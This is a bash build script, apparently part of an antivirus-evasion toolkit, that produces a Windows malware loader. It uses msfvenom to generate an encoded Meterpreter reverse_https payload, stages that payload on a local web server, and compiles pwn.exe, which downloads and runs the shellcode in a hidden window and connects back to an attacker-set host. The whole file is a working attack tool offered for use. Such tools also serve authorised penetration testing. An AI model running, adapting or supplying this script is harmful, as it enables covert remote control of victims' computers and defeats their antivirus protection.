#!/bin/bash          
# build the .exe file that loads the payload from a given text file

# include script containing the compiler var $win32_compiler
# you can edit the compiler in build/global_win32.sh
# or enter $win32_compiler="mycompiler" here
. build/global_win32.sh

# import global default lhost and lport values from build/global_connect_config.sh
. build/global_connect_config.sh

# override connect-back settings here, if necessary
LPORT=$GLOBAL_LPORT
LHOST=$GLOBAL_LHOST

# make meterpreter reverse payload, encoded with shikata_ga_nai
# additionaly to the avet encoder, further encoding should be used
msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -f raw -a x86 -b "\x00" --platform Windows > thepayload.bin

# copy file to standart web server dir
cp thepayload.bin /var/www/html

# call make_avet, the -l stands for loading and exec shellcode from given file 
# -d certutil downloads the file from a url, -q hides window
./make_avet -l -d powershell -p

# compile to pwn.exe file
$win32_compiler -o pwn.exe avet.c
strip pwn.exe

# cleanup
echo "" > defs.h

# call your programm with pwn.exe thepayload.bin http://myserver/thepayload.bin 
